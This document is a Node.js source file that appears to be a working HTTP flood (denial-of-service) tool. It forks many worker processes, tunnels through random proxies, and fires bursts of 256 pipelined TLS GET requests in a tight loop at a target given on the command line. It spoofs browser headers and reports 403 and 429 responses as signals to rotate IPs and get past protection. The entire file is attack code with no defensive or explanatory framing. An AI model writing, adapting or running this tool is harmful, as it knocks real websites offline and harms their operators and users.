const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
const http = require("http");
const tls = require("tls");


process.on('uncaughtException', function (er) {
    //console.error(er)
});
process.on('unhandledRejection', function (er) {
    //console.error(er)
});

var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxys = process.argv[5].split(",");

if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start flood!');
    startflood(target_url);
}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}


function startflood(page) {
    console.log('Start attack!');
    setInterval(() => {
        var proxy = getRandomElement(proxys).replace(/\n/g, "");
        var parsed = url.parse(page);
        var ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0";
        var http = require('http'), tls = require('tls');
        var req = http.request({
            //set proxy session
            host: proxy.split(':')[0],
            port: proxy.split(':')[1],
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return 1;
        });
        req.on('connect', function (res, socket, head) {
            var tlsConnection = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
                for (let j = 0; j < 256; j++) {
                    tlsConnection.write("GET / HTTP/1.1\r\nHost: "+parsed.host+"\r\nUser-Agent: "+ua+"\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n");
                }
                tlsConnection.end();
                //tlsConnection.destroy();
            });
            tlsConnection.setEncoding('utf8');
            tlsConnection.on('error', function (data) {
                tlsConnection.end();
                //console.log(error);
            });
            tlsConnection.on('data', function (data) {
                //console.log(data);
                if (data.includes("403 Forbidden")) {
                    console.log("Error bypass! Change ip!");
                    tlsConnection.end();
                }
                if (data.includes("429 Too Many")) {
                    console.log("Rate limit! Change ip");
                    tlsConnection.end();
                }
            });
        });
        req.end();
    });
}



